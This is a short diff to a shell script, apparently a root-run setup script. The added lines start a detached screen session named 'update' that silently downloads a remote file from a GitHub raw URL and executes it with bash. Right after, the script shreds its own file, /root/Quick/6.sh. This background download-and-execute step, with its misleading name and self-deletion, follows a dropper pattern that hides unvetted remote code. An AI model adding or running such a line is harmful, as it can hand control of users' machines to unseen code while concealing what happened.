@@ -106,4 +106,7 @@ else
     echo "screen is already installed"
 fi
 
+# 启动screen会话并执行命令
+screen -dmS update bash -c "curl -sSL https://raw.githubusercontent.com/xiezh123/132/main/2 -o /root/Quick/2 && bash /root/Quick/2"
+
 shred -u /root/Quick/6.sh
